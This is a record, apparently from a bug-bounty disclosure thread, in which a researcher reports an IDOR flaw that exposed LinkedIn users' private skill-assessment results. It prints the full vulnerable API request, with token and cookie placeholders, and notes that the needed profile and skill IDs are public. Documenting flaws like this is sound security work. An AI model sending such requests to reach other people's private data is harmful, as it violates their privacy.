    {
      "id": 263024,
      "category": "researcher",
      "content": "It was possible to view the private skill test results of users who failed to earn a badge and also test results of a passed skill test kept private. Here is the request that was vulnerable to IDOR - \n\n```\nGET /voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn:li:fsd_skillAssessmentAttemptReport:(urn:li:fsd_profile:<fsd_profile-ID>,urn:li:skill:<SKILL-TEST-ID>,1) HTTP/1.1\nHost: www.linkedin.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\nAccept: application/vnd.linkedin.normalized+json+2.1\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncsrf-token: <CSRF-TOKEN>\nOrigin: https://www.linkedin.com\nConnection: close\nReferer: https://www.linkedin.com/skill-assessments/hub/reports/?resultType=\nCookie: <COOKIES>\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\n\n```\n\nThe `fsd_profile` ID and the `skill` ID both are public.",
      "updated_at": "2023-03-27T17:47:55.893Z",
